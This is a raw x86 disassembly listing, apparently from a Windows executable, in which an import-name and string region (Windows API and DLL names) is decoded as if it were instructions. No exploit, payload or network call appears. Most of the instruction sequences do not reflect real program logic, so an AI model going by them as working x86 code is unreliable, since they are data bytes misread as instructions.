  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
